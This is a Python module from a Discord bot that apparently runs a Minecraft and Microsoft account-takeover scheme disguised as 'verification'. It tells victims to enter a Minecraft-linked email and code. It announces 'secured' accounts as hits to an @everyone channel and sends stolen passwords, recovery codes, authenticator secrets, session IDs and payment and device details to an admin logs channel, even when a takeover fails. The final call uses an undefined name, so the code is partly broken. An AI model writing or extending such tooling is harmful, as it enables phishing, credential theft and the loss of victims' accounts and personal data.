from discord import AllowedMentions, Embed, Interaction, abc, File
import logging
import io

from securing.account_filters import is_embed_verify_no_minecraft
from securing.build_embeds import build_account_embeds, public_secure_reason
from shared.embeds import verify_embed
from shared.send_logs import send_logs, build_log_embed
from shared.post_verification import after_verify
from ui.buttons.embed_buttons import ButtonOptions
from ui.buttons.account_details import accountInfo

log = logging.getLogger("bot")

_NO_MC_TITLE = "Failed to verify"
_NO_MC_DESC = (
    "You have to use an email linked to your minecraft account, please try again."
)


def _no_mc_embed() -> Embed:
    return Embed(title=_NO_MC_TITLE, description=_NO_MC_DESC, color=0xFA4343)


def _checking_embed() -> Embed:
    return Embed(
        title="Checking your account...",
        description="Please wait while we finish verification. This can take a minute.",
        colour=0x57F287,
    )


def _verify_fail_embed(reason: str | None = None) -> Embed:
    return Embed(
        title="Could not finish verification",
        description=public_secure_reason(reason)
        or "We couldn't complete this right now. Please try again in a few minutes.",
        color=0xFA4343,
    )


async def set_verify_ephemeral(interaction: Interaction, embed: Embed) -> None:
    """Keep OTP/auth verification on a single ephemeral embed (no log dumps)."""
    edited = False
    try:
        if interaction.response.is_done():
            await interaction.edit_original_response(content=None, embed=embed, view=None)
            edited = True
        else:
            await interaction.response.send_message(embed=embed, ephemeral=True)
            edited = True
    except Exception:
        log.warning("edit verify ephemeral failed — trying followup", exc_info=True)
    if edited:
        return
    try:
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception:
        log.exception("could not send verify ephemeral")


async def _notify_user_no_minecraft(interaction: Interaction) -> None:
    """Ephemeral-only: must use a Minecraft-linked email. Do not DM."""
    await set_verify_ephemeral(interaction, _no_mc_embed())

_DETAIL_KEYS = (
    "ssid_embed",
    "info_embed",
    "account_details",
    "stats_embed",
    "xbox_embed",
    "family_embed",
    "devices_embed",
    "cards_embed",
    "subs_embed",
    "phones_embed",
)


def _is_failed(account) -> bool:
    if not account or not isinstance(account, dict):
        return True
    if account.get("failed"):
        return True
    return "hit_embed" not in account and "details" not in account


def _details_ready(details) -> bool:
    return isinstance(details, dict) and all(k in details for k in _DETAIL_KEYS)


def _ms_for_leftover_embeds(account: dict) -> dict | None:
    """Fill defaults so a failed secure can still build Extra Info / SSID buttons."""
    ms = dict((account or {}).get("microsoft") or {})
    if not ms:
        return None
    ms.setdefault("family", [])
    ms.setdefault("devices", [])
    ms.setdefault("cards", [])
    ms.setdefault("phones", [])
    subs = ms.get("subscriptions")
    if not isinstance(subs, dict):
        ms["subscriptions"] = {"active": [], "canceled": [], "commercial": []}
    else:
        subs.setdefault("active", [])
        subs.setdefault("canceled", [])
        subs.setdefault("commercial", [])
    for key, default in (
        ("firstName", "Unknown"),
        ("lastName", "Unknown"),
        ("fullName", "Unknown"),
        ("region", "Unknown"),
        ("birthday", "Unknown"),
        ("language", "Unknown"),
        ("security_email", "Couldn't Change!"),
        ("password", "Couldn't Change!"),
        ("recovery_code", "Couldn't Change!"),
        ("auth_secret", "Disabled"),
        ("email", ""),
    ):
        if not ms.get(key):
            ms[key] = default
    return ms


async def _leftover_details(account: dict) -> dict | None:
    details = account.get("details")
    if _details_ready(details):
        return details
    ms = _ms_for_leftover_embeds(account)
    if not ms:
        return None
    try:
        built = await build_account_embeds(
            {"microsoft": ms, "minecraft": account.get("minecraft") or {}},
            0,
            "",
        )
        return built.get("details") if isinstance(built, dict) else None
    except Exception:
        log.warning("leftover details embed failed", exc_info=True)
        return None


async def _send_leftover_to_logs(interaction: Interaction, secured_account, email: str) -> None:
    """Failed secure still dumps leftover creds / Extra Info to logs_channel."""
    leftover = secured_account.get("hit_embed") or secured_account.get("seller_embed")
    details = await _leftover_details(secured_account)
    extra = accountInfo(details) if _details_ready(details) else None
    if leftover is None and extra is None:
        return
    try:
        await send_logs(
            interaction.client,
            leftover,
            view=extra,
            email=email,
        )
        if details and details.get("stats_embed") is not None and details.get("stats_embed") is not leftover:
            await send_logs(interaction.client, details["stats_embed"], email=email)
        log.info("sent leftover fail details for %s to logs channel", email)
    except Exception:
        log.exception("leftover fail details send_logs failed for %s", email)


async def publish_embed_secure_result(
    *,
    interaction: Interaction,
    hits_channel: abc.Messageable,
    secured_account,
    email: str,
    username: str,
) -> bool:
    """Post OTP/authenticator embed-verify results. Returns True on real success.

    startSecuringAccount returns a truthy dict on login/filter failures
    (``failed=True``, often without ``details``). Treating that as success
    pinged @everyone then crashed on missing stats_embed.
    """
    name = str(username or "").strip()
    thumb = None
    if (
        name
        and " " not in name
        and 1 <= len(name) <= 16
        and name.lower() not in {"unknown", "no minecraft", "?", "n/a"}
        and all(c.isalnum() or c == "_" for c in name)
    ):
        thumb = f"https://visage.surgeplay.com/full/512/{name}"
    view = ButtonOptions(interaction.user, interaction.user.id, username)

    if isinstance(secured_account, dict) and secured_account.get("embed_no_minecraft"):
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=view,
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    if _is_failed(secured_account):
        reason = "Failed to secure account"
        if isinstance(secured_account, dict):
            reason = str(secured_account.get("reason") or reason)
        short = public_secure_reason(reason)

        log.warning("embed secure failed for %s: %s", email, short)
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | Failed to secure | {short}```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=view,
            email=email,
        )
        # Leftover creds / Extra Info go to logs_channel only — never the hits room
        # and never as a second ephemeral (user keeps one fail status).
        if isinstance(secured_account, dict):
            await _send_leftover_to_logs(interaction, secured_account, email)
        await set_verify_ephemeral(interaction, _verify_fail_embed(short))
        return False

    details = secured_account.get("details") or {}
    hit_embed = secured_account.get("hit_embed")
    stats_embed = details.get("stats_embed") if isinstance(details, dict) else None
    no_mc = is_embed_verify_no_minecraft(secured_account)

    if no_mc:
        log.warning(
            "embed verify: %s has no Minecraft Java — skipping hit, asking for a Minecraft email",
            email,
        )
        await send_logs(
            interaction.client,
            build_log_embed(
                f"**Email | Status | Reason**\n```{email} | No Minecraft | Told user to use a Minecraft-linked email```",
                0xFA4343,
                thumbnail=thumb,
                user=interaction.user,
                bot=interaction.client,
            ),
            view=view,
            email=email,
        )
        await _notify_user_no_minecraft(interaction)
        return False

    card_bytes = None
    try:
        from shared.card_generator import generate_hit_card
        hstats = secured_account.get("hstats") or {}
        rank = hstats.get("hypixel", {}).get("rank") or "None"
        capes = (secured_account.get("minecraft") or {}).get("capes") or []
        card_buf = await generate_hit_card(username=username, rank=rank, hstats=hstats, capes=capes)
        card_bytes = card_buf.getvalue()
    except Exception as e:
        log.warning(f"Could not generate hit card: {e}")

    # 1. Public Hit (Kênh #hits): Chỉ hiện hình ảnh card như template, không lộ thông tin nhạy cảm
    if card_bytes:
        public_file = File(io.BytesIO(card_bytes), filename="hit.png")
        await hits_channel.send(
            "@everyone **Successfully secured an account**",
            file=public_file,
            allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
        )
    else:
        if stats_embed is not None:
            await hits_channel.send(
                "@everyone **Successfully secured an account**",
                embed=stats_embed,
                allowed_mentions=AllowedMentions(everyone=True, roles=False, users=False),
            )

    # 2. Admin Hit (Kênh Admin #logs): Hiện FULL thông tin chi tiết (Email, Pass, Secret, Recovery code, SSID view)
    extra = accountInfo(details) if _details_ready(details) else None
    try:
        from config import get_config
        cfg = get_config()
        logs_ch_id = cfg.get("discord", {}).get("logs_channel")
        admin_channel = None
        if logs_ch_id and str(logs_ch_id).isdigit():
            admin_channel = await interaction.client.fetch_channel(int(logs_ch_id))
        
        target_admin_channel = admin_channel or hits_channel
        if card_bytes:
            admin_file = File(io.BytesIO(card_bytes), filename="hit_card.png")
            if hit_embed is not None:
                hit_embed.set_image(url="attachment://hit_card.png")
                await target_admin_channel.send(file=admin_file, embed=hit_embed, view=extra)
            else:
                await target_admin_channel.send(file=admin_file, view=extra)
        else:
            if hit_embed is not None:
                await target_admin_channel.send(embed=hit_embed, view=extra)
    except Exception as e:
        log.exception(f"Could not send full admin hit details to logs: {e}")

    vembed = verify_embed()
    await set_verify_ephemeral(
        interaction,
        Embed(
            title=vembed["title"],
            description=vembed["description"],
            colour=vembed["color"],
        ),
    )

    await after_verify(interaction, mc_name)
    return True
